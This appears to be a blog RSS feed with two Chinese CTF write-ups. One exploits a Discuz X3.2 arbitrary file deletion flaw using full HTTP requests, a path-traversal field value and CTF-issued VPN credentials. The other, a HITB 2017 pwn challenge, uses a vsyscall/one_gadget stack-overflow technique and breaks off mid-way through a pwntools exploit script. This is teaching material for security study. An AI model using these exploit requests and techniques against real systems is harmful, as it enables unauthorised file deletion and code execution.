<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">IPsec VPN server is now ready for use!</div><div class="line"></div><div class="line"></div><div class="line">Connect to your new VPN with these details:</div><div class="line"></div><div class="line"></div><div class="line">Server IP: 54.223.177.152</div><div class="line">IPsec PSK: dkQ97gGQPuVm833Ed2F9</div><div class="line">Username: pwnhub</div><div class="line">Password: LE3U2aTgc4DGZd92wg82</div><div class="line"></div><div class="line"></div><div class="line">Write these down. You&apos;ll need them to connect!</div></pre></td></tr></table></figure>
<p>这里想找个linux图形界面连IPsec的软件，但没找到，还是切换到Mac了。。</p>
<p>VPN连上后应该就是内网找服务了，因为nmap探测的很慢，所以只探测80端口</p>
<p>咸鱼了一会后发现几台主机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">172.17.0.1</div><div class="line">172.17.0.3</div><div class="line">172.17.0.5</div><div class="line">172.17.0.7</div><div class="line">172.17.0.9</div></pre></td></tr></table></figure>
<p>从这可以看出来这是一个docker，其中1是外网那个服务的容器，其他80端口都是nginx默认端口，然后扫描3发现还开了8090，根据之后的提示：<code>搞 Discuz 不是目的，谁说鸡肋就没用，看 Discuz 送助攻</code></p>
<h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>8090端口开的就是一个dz x3.2服务，然后就知道是搞这个了，找了下dz的漏洞去尝试，发现只有ssrf，有最新的任意文件删除的是有效的。</p>
<p>然后发现自己太菜了，根本不会做web，日不动dz。。。。。。</p>
<p>然后偶然间发现。。。。80端口变了，竟然不是默认的nginx服务了, 是一个跳转到<code>index.php</code>的html页面，<code>index.php</code>页面如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>get flag?<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- include 'safe.php';</span></div><div class="line"></div><div class="line"></div><div class="line">if($_REQUEST['passwd'] === 'jiajiajiajiajia')&#123;</div><div class="line">    echo "$flag";</div><div class="line">&#125; --&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line">Oh,Hacked ?</div></pre></td></tr></table></figure>
<p>尝试访问：<code>http://172.17.0.3/index.php?passwd=jiajiajiajiajia</code>当然是失败的，因为有个<code>safe.php</code></p>
<p>然后根据前面dz获取到的信息，猜测safe.php是ip过滤，然后我得到一个思路(当然是错误的思路): 利用dz的ssrf访问<code>http://127.0.0.1/index.php?passwd=jiajiajiajiajia</code>, 因为dz的ssrf是一个远程图片下载的，所以会把请求到的信息下载下来保存到本地，然后<code>/data</code>目录是可遍历的，文件会下载到<code>data/attachment/profile/201710/0x</code>目录下。</p>
<p>但是目录遍历到201710就没法遍历了，发现是有一个index.html，然后有了一个思路，是利用任意文件删除漏洞把index.html删除，成功了，可以看到<code>data/attachment/profile/201710/04/</code>目录下的文件了，然后尝试ssrf，但是是失败的，源码审计看了一会，原来dz把ssrf请求下来的保存成文件后会获取图片信息，如果获取失败会删除。</p>
<p>想了想竞争，但是从保存文件到删除文件，间隔时间太短了，竞争不靠谱。。。又陷入僵局</p>
<p>然后出题人半夜改题了，一个开始80是nginx服务，dz是apache服务。然后换成了80是apache，dz是nginx。</p>
<p>然后我之前的思路就完成GG了，因为无法获取到下载下来的文件名。</p>
<p>然后就只剩一个思路了，利用dz的任意文件删除漏洞，删除safe.php</p>
<p>最开始我也想过这个，但是这个思路的问题太多了，一个是两个不同服务，凭啥有权限删除，safe.php又不是在upload这种会777的目录下，第二就是，一个人做出来了其他人不也做出来了</p>
<p>半夜2点多的时候尝试删除safe.php，失败，睡觉，早上9点多起来发现已经3血了，再次尝试，成功。。。。。。。。。。。。。。。。。。</p>
<p>没有写PoC，手工做题，首先python先跑起来：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; while True:</div><div class="line">...     r = requests.get(url3)</div><div class="line">...     print r.content</div><div class="line">...     if r.status_code == 404:</div><div class="line">...         print "right"</div><div class="line">...         r = requests.get(url2)</div><div class="line">...         print r.content</div><div class="line">...     time.sleep(1)</div><div class="line">Oh,Hacked ?</div></pre></td></tr></table></figure>
<p>然后使用burp，首先是请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line">POST /home.php?mod=spacecp&amp;ac=profile&amp;op=base HTTP/1.1</div><div class="line">Host: 172.17.0.3:8090</div><div class="line">Content-Length: 2244</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://172.17.0.3:8090</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</div><div class="line">Referer: http://172.17.0.3:8090/home.php?mod=spacecp&amp;ac=profile&amp;op=base</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4</div><div class="line">Cookie: 3LFi_2132_saltkey=iAo9aN8L; 3LFi_2132_lastvisit=1507028276; 3LFi_2132_sendmail=1; 3LFi_2132_home_readfeed=1507037399; 3LFi_2132_seccode=19.90700de229cc94ae7e; 3LFi_2132_ulastactivity=5e6dmN2yw6RW9gYAeu0%2BFQj4zPpXufkmFS79DZbibxsS1GKyf30i; 3LFi_2132_auth=e93etvAAYQo0lvRVwL9syLfiWnGnZj7HnZAZRfhXA84VUXaWbScrKrKqleMUclzMt%2FB67ybK%2FTtRoNhg%2FF7V; 3LFi_2132_lastcheckfeed=3%7C1507037417; 3LFi_2132_lip=172.17.0.2%2C1507030640; 3LFi_2132_nofavfid=1; 3LFi_2132_onlineusernum=1; 3LFi_2132_checkpm=1; 3LFi_2132_sid=QGWdpE; 3LFi_2132_lastact=1507037551%09misc.php%09patch</div><div class="line">Connection: close</div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;formhash&quot;</div><div class="line"></div><div class="line">89dbe522</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;realname&quot;</div><div class="line"></div><div class="line">aklis</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[realname]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;gender&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[gender]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;birthyear&quot;</div><div class="line"></div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;birthmonth&quot;</div><div class="line"></div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;birthday&quot;</div><div class="line"></div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[birthday]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;birthprovince&quot;</div><div class="line"></div><div class="line">../../../../../../../../../usr/share/nginx/html/safe.php</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[birthcity]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;resideprovince&quot;</div><div class="line"></div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[residecity]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;affectivestatus&quot;</div><div class="line"></div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[affectivestatus]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;lookingfor&quot;</div><div class="line"></div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[lookingfor]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;bloodtype&quot;</div><div class="line"></div><div class="line">A</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[bloodtype]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;profilesubmit&quot;</div><div class="line"></div><div class="line">true</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;profilesubmitbtn&quot;</div><div class="line"></div><div class="line">true</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq--</div></pre></td></tr></table></figure>
<p>然后再请求:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">POST /home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;deletefile[birthprovince]=aaa HTTP/1.1</div><div class="line">Host: 172.17.0.3:8090</div><div class="line">Connection: close</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept: */*</div><div class="line">User-Agent: python-requests/2.18.1</div><div class="line">Content-Length: 543</div><div class="line">Cookie: 3LFi_2132_saltkey=iAo9aN8L; 3LFi_2132_lastvisit=1507028276; 3LFi_2132_home_readfeed=1507037399; 3LFi_2132_ulastactivity=5e6dmN2yw6RW9gYAeu0%2BFQj4zPpXufkmFS79DZbibxsS1GKyf30i; 3LFi_2132_auth=e93etvAAYQo0lvRVwL9syLfiWnGnZj7HnZAZRfhXA84VUXaWbScrKrKqleMUclzMt%2FB67ybK%2FTtRoNhg%2FF7V; 3LFi_2132_lastcheckfeed=3%7C1507037417; 3LFi_2132_nofavfid=1; 3LFi_2132_visitedfid=2; 3LFi_2132_forum_lastvisit=D_2_1507041771; 3LFi_2132_st_p=3%7C1507041805%7C587c0547c79d9aad1865192204c3e348; 3LFi_2132_viewid=tid_1; 3LFi_2132_lip=172.17.0.2%2C1507041386; 3LFi_2132_st_t=3%7C1507042459%7Cec88a27fedbb1c6205e196d933f91e42; 3LFi_2132_editormode_e=1; 3LFi_2132_seccode=47.a0f88955fd6a0cfce9; 3LFi_2132_smile=1D1; 3LFi_2132_onlineusernum=9; 3LFi_2132_checkpm=1; 3LFi_2132_sendmail=1; 3LFi_2132_home_diymode=1; 3LFi_2132_sid=A92w24; 3LFi_2132_lastact=1507046589%09home.php%09misc</div><div class="line">Content-Type: multipart/form-data; boundary=2b4ed56c9a8d4dff838f4fba3c258b9b</div><div class="line"></div><div class="line">--2b4ed56c9a8d4dff838f4fba3c258b9b</div><div class="line">Content-Disposition: form-data; name=&quot;profilesubmit&quot;</div><div class="line"></div><div class="line">1</div><div class="line">--2b4ed56c9a8d4dff838f4fba3c258b9b</div><div class="line">Content-Disposition: form-data; name=&quot;formhash&quot;</div><div class="line"></div><div class="line">89dbe522</div><div class="line">--2b4ed56c9a8d4dff838f4fba3c258b9b</div><div class="line">Content-Disposition: form-data; name=&quot;birthprovince&quot;; filename=&quot;a.png&quot;</div><div class="line">Content-Type: image/png</div><div class="line"></div><div class="line">PS: 正常的图片，因为有不可显字符，就不复制上来了，懒得截图....</div><div class="line">--2b4ed56c9a8d4dff838f4fba3c258b9b--</div></pre></td></tr></table></figure>
<p>然后成功getflag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">File not found.</div><div class="line"></div><div class="line">right</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=&quot;en&quot;&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</div><div class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</div><div class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</div><div class="line">    &lt;title&gt;get flag?&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;!-- include &apos;safe.php&apos;;</div><div class="line"></div><div class="line"></div><div class="line">if($_REQUEST[&apos;passwd&apos;] === &apos;jiajiajiajiajia&apos;)&#123;</div><div class="line">    echo &quot;$flag&quot;;</div><div class="line">&#125; --&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"></div><div class="line">pwnhub&#123;flag:800eaf3244994b224c30e5f24b59f178&#125;</div></pre></td></tr></table></figure>
<p>PS: 这题我给的评分是4，我觉得最后一步是本题的败笔，首先环境的问题就不说了。主要是这个思路，只是为出题而设置的，没啥其他意义。。。。前面的思路都挺好的。</p>
<p>本文就附一张图：</p>
<p><img src="http://qn.lazysheep.cc/img/cai.jpg" alt="wohaocaia.jpg"></p>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/10/04/0x3A/#disqus_thread</comments>
    </item>
    
    <item>
      <title>HITB CTF 2017 Pwn题研究🙉</title>
      <link>http://0x48.pw/2017/08/29/0x39/</link>
      <guid>http://0x48.pw/2017/08/29/0x39/</guid>
      <pubDate>Tue, 29 Aug 2017 11:11:04 GMT</pubDate>
      <description>
      
        &lt;p&gt;上周的HITB CTF 2017看了两道Pwn题，可是都没做出来，看了writeup后，发现又学到了新姿势了…..&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>上周的HITB CTF 2017看了两道Pwn题，可是都没做出来，看了writeup后，发现又学到了新姿势了…..</p>
<a id="more"></a>
<p>题目在我GitHub上有：🔞<a href="https://github.com/Hcamael/CTF_repo/tree/master/HITB%20CTF%202017/Pwn2(1000levels)" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/HITB%20CTF%202017/Pwn2(1000levels)</a></p>
<h1 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h1><p>这题是一道栈溢出的题目，溢出点也很容易找到，但问题是开了EIP，当时的思路是想可能有啥骚操作可以让hint函数泄露出system地址……可惜一直想错了，最主要有一个知识点我不知道</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> cat /proc/self/maps</span></div><div class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</div></pre></td></tr></table></figure>
<p>以前从来没注意到过，linux下的每个程序都有一个这样的虚拟地址，而且不管开没开EIP，这段地址都是不变的。</p>
<p>再开看看这段地址是啥指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/5i 0xffffffffff600000</div><div class="line">   0xffffffffff600000:	mov    rax,0x60</div><div class="line">   0xffffffffff600007:	syscall </div><div class="line">   0xffffffffff600009:	ret</div></pre></td></tr></table></figure>
<p>就是一个不知道啥的系统调用然后ret，然后查了一些资料，这段地址是内核映射出来让程序调用内核一些功能的。而这段有用的指令就是一个ret，那么通过这个ret我们能进行怎样的骚操作？</p>
<p>首先要先能理清楚栈结构，当我们的的流程是这样的时候：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">main -&gt; hint -&gt; main -&gt; go -&gt; level</div></pre></td></tr></table></figure>
<p>首先我们调用hint函数时，栈是这样的：</p>
<p><img src="http://qn.lazysheep.cc/img/hitb1.png" alt="hitb1"></p>
<p>然后在hint函数中并没有输出system的地址，但是却把system的地址放入了栈中</p>
<p>执行完hint函数后，返回main函数，然后再调用go函数，这个时候栈是这样的：</p>
<p><img src="http://qn.lazysheep.cc/img/hitb2.png" alt="hitb2"></p>
<p>在hint函数中存放system地址的栈是在上图中变量v6的位置，在go函数中还调用了level函数，而溢出正好就是在level函数中，所以如果我们溢出构造一个栈地址如下所示</p>
<table>
<thead>
<tr>
<th style="text-align:center">0xffffffffff600000</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0xffffffffff600000</td>
</tr>
<tr>
<td style="text-align:center">0xffffffffff600000</td>
</tr>
<tr>
<td style="text-align:center">v6(&amp;system)</td>
</tr>
</tbody>
</table>
<p>这样就能执行system函数了</p>
<p>然后我们再来解决其他问题，v6是啥？会不会覆盖system，能执行system但是不能控制参数等问题。</p>
<p>见如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">v2 = read_num();</div><div class="line"><span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</div><div class="line">	v5 = v2;</div><div class="line"><span class="keyword">else</span></div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Coward"</span>);</div><div class="line"><span class="built_in">puts</span>(<span class="string">"Any more?"</span>);</div><div class="line">v3 = read_num();</div><div class="line">v6 = v5 + v3;</div></pre></td></tr></table></figure>
<p>上面的代码是ida反编译go函数的代码，这部分要结合汇编看</p>
<p>v5和v6的地址是一样的，所以如果输入的v2值大于0，则会把system的地址覆盖掉，这很好解决，输入负数和0都行，然后通过v3的输入，我们能在system地址的基础上进行加减。</p>
<p>因为有libc，所以我们可以先获取system的符号地址为<code>0x45390</code></p>
<p>然后使用<code>one_gadget</code>工具：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> one_gadget libc.so.6 </span></div><div class="line">0x4526a	execve("/bin/sh", rsp+0x30, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x30] == NULL</div><div class="line"></div><div class="line">0xcd0f3	execve("/bin/sh", rcx, r12)</div><div class="line">constraints:</div><div class="line">  [rcx] == NULL || rcx == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xcd1c8	execve("/bin/sh", rax, r12)</div><div class="line">constraints:</div><div class="line">  [rax] == NULL || rax == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xf0274	execve("/bin/sh", rsp+0x50, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x50] == NULL</div><div class="line"></div><div class="line">0xf1117	execve("/bin/sh", rsp+0x70, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x70] == NULL</div><div class="line"></div><div class="line">0xf66c0	execve("/bin/sh", rcx, [rbp-0xf8])</div><div class="line">constraints:</div><div class="line">  [rcx] == NULL || rcx == NULL</div><div class="line">  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL</div></pre></td></tr></table></figure>
<p>能获取到执行<code>execve(&#39;/bin/sh&#39;)</code>指令的地址，随便选一个和system地址相减得到差值，这个值就是v3，这样就把system的地址设置成执行<code>execve</code>的地址了，这样当rip跳到这里时就能直接执行系统命令了。</p>
<p>但是还有一个小细节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( v6 &gt; <span class="number">0</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">999</span> )</div><div class="line">    &#123;</div><div class="line">      v7 = v6;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"More levels than before!"</span>);</div><div class="line">      v7 = <span class="number">1000L</span>L;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Let's go!'"</span>);</div><div class="line">    v4 = time(<span class="number">0L</span>L);</div><div class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)level(v7) != <span class="number">0</span> )</div><div class="line">    &#123;</div><div class="line">      v1 = time(<span class="number">0L</span>L);</div><div class="line">      <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;v8, <span class="string">"Great job! You finished %d levels in %d seconds\n"</span>, v7, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v1 - v4), v3);</div><div class="line">      <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v8);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"You failed."</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>因为<code>execve</code>的地址大于999，所以v7被设置为1000，所以level需要进行1000次递归</p>
<p>第一种思路是写代码，自动答对所有题目，然后在最后一次递归的时候溢出</p>
<p>还有因为溢出的长度有0x200，所以其实不必跑1000次</p>
<p>如果没有答对题目，递归则会退出，就没法进行溢出了</p>
<p>最后得到payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"></div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(<span class="string">'./1000levels'</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</div><div class="line">	context.terminal = [<span class="string">'terminator'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</div><div class="line">	context.log_level = <span class="string">"debug"</span></div><div class="line">	<span class="comment"># gdb.attach(p)</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(<span class="string">'47.74.147.103'</span>, <span class="number">20001</span>)</div><div class="line"></div><div class="line">libc_base = <span class="number">-0x45390</span></div><div class="line">one_gadget_base = <span class="number">0x4526a</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ansewer</span><span 